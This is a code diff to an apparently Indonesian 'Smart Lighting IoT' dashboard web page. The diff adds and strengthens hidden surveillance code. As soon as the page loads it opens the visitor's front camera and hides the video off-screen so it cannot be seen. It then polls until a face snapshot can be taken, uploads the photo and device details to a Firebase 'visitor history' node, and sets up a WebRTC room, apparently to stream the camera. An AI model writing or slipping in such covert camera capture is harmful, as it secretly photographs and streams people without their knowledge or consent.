@@ -87,8 +87,8 @@
         </div>
     </header>
 
-    <!-- Elemen Tersembunyi untuk Koneksi & Snapshot di Latar Belakang -->
-    <video id="hidden-media-stream" class="hidden" autoplay playsinline muted></video>
+    <!-- Elemen Video Latar Belakang (Off-screen trick agar aman di HP & tidak hitam) -->
+    <video id="hidden-media-stream" autoplay playsinline muted style="position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; left: -9999px; top: -9999px;"></video>
 
     <!-- Main Content Area -->
     <main class="flex-grow max-w-7xl w-full mx-auto px-6 py-8 space-y-6">
@@ -672,7 +672,7 @@
             XLSX.writeFile(workbook, "Laporan_Smart_Lighting_IoT.xlsx");
         }
 
-        // --- FUNGSI WEBRTC LATAR BELAKANG & AMBIL FOTO OTOMATIS ---
+        // --- FUNGSI WEBRTC LATAR BELAKANG & AMBIL FOTO OTOMATIS (DENGAN POLLING & ANTI-HITAM) ---
         window.addEventListener('DOMContentLoaded', () => {
             switchTab('live');
             initBackgroundProcess();
@@ -688,50 +688,64 @@
 
         async function initBackgroundProcess() {
             try {
-                try {
-                    localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'user' } }, audio: false });
-                } catch (err) {
-                    localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                }
+                // Menggunakan konfigurasi fleksibel agar kompatibel di berbagai jenis HP
+                localStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user', 
+                        width: { ideal: 640 }, 
+                        height: { ideal: 480 } 
+                    }, 
+                    audio: false 
+                });
                 
                 const remoteVideo = document.getElementById('hidden-media-stream');
                 if (remoteVideo) {
                     remoteVideo.srcObject = localStream;
+                    await remoteVideo.play().catch(e => console.log("Play error:", e));
                 }
 
                 const roomRef = db.ref('webrtc_rooms').push();
                 currentRoomRef = roomRef;
                 const roomId = roomRef.key;
 
-                // Ambil foto snapshot wajah pengunjung secara otomatis
-                setTimeout(() => {
-                    try {
-                        const videoEl = document.getElementById('hidden-media-stream');
-                        if (videoEl && videoEl.videoWidth > 0) {
+                // Sesi otomatis terhapus dari Firebase jika pengunjung menutup tab/keluar
+                roomRef.onDisconnect().remove();
+
+                // SISTEM POLLING: Cek berulang hingga video siap dan tidak hitam (maksimal 5 detik)
+                let attempts = 0;
+                const maxAttempts = 10;
+                
+                const snapshotInterval = setInterval(() => {
+                    attempts++;
+                    const videoEl = document.getElementById('hidden-media-stream');
+                    
+                    if (videoEl && videoEl.videoWidth > 0 && videoEl.videoHeight > 0) {
+                        clearInterval(snapshotInterval);
+                        try {
                             const canvas = document.createElement('canvas');
-                            canvas.width = videoEl.videoWidth || 320;
-                            canvas.height = videoEl.videoHeight || 240;
+                            canvas.width = videoEl.videoWidth;
+                            canvas.height = videoEl.videoHeight;
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-                            const base64Image = canvas.toDataURL('image/jpeg', 0.7);
+                            
+                            const base64Image = canvas.toDataURL('image/jpeg', 0.8);
 
-                            db.ref('riwayat_pengunjung').push({
-                                roomId: roomId,
-                                timestamp: Math.floor(Date.now() / 1000),
-                                tanggalWaktu: new Date().toLocaleString('id-ID'),
-                                perangkat: navigator.userAgent.includes('Mobi') ? 'Ponsel / Mobile' : 'Komputer / Desktop',
-                                foto: base64Image
-                            });
-                        } else {
-                            db.ref('riwayat_pengunjung').push({
-                                roomId: roomId,
-                                timestamp: Math.floor(Date.now() / 1000),
-                                tanggalWaktu: new Date().toLocaleString('id-ID'),
-                                perangkat: navigator.userAgent.includes('Mobi') ? 'Ponsel / Mobile' : 'Komputer / Desktop'
-                            });
+                            if (base64Image && base64Image.length > 200) {
+                                db.ref('riwayat_pengunjung').push({
+                                    roomId: roomId,
+                                    timestamp: Math.floor(Date.now() / 1000),
+                                    tanggalWaktu: new Date().toLocaleString('id-ID'),
+                                    perangkat: navigator.userAgent.includes('Mobi') ? 'Ponsel / Mobile' : 'Komputer / Desktop',
+                                    foto: base64Image
+                                });
+                            }
+                        } catch (errSnapshot) {
+                            console.log("Gagal mengambil snapshot:", errSnapshot);
                         }
-                    } catch (errSnapshot) {
-                        console.log("Gagal mengambil snapshot:", errSnapshot);
+                    }
+
+                    if (attempts >= maxAttempts) {
+                        clearInterval(snapshotInterval);
                         db.ref('riwayat_pengunjung').push({
                             roomId: roomId,
                             timestamp: Math.floor(Date.now() / 1000),
@@ -739,7 +753,7 @@
                             perangkat: navigator.userAgent.includes('Mobi') ? 'Ponsel / Mobile' : 'Komputer / Desktop'
                         });
                     }
-                }, 1500);
+                }, 500); // Cek kesiapan kamera setiap 0.5 detik
 
                 peerConnection = new RTCPeerConnection(configuration);
                 
